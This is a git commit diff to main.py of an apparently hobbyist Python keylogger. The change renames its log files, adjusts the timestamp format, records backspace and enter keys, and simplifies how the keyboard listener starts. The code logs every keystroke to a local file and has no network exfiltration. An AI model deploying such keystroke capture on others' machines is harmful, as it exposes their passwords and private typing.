1cb55c17618b99b4a69e15be3b03fc3bfbf99bb6
Balaj-dev <mbalajmubeen@gmail.com>
2025-11-22 12:47:25 +0500

    renamed logger_result.txt

--- main.py
+++ main.py
@@ -4,14 +4,14 @@ from datetime import datetime
 
 #getting current date and time
 now = datetime.now()
-now = (now.strftime("%Y-%m-%d %H:%M"))
+now = (now.strftime("%Y-%m-%d %H-%M"))
 
 
 #creating and opening file
-with open("logger_result.txt" , "a") as file:
+with open("log_files_id_info.txt", "w") as file:
     file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")
 
-with open(f"{now}_Keylogger_data" , "w") as file:
+with open(f"{now}_Keylogger_data" , "a") as file:
     file.write(" ")
 
 
@@ -26,18 +26,14 @@ def pressed(key):
     except:
         key_pressed = format(key)
         with open(f"{now}_Keylogger_data", "a") as file:
-            if key_pressed == "key.enter":
-                file.write('\n ')
+            if key_pressed == 'Key.backspace':
+                file.write("*")
+            if key_pressed == "Key.enter":
+                file.write('\n')
             if key_pressed == "Key.space":
                 file.write(" ")
 
-#assigning main function (pressed) to a pre-defined variable
+#start the listening
 with keyboard.Listener(
     on_press=pressed) as listner:
     listner.join()
-listener = keyboard.Listener(
-    on_press=pressed)
-
-
-#starting the program by calling the main function
-listener.start()
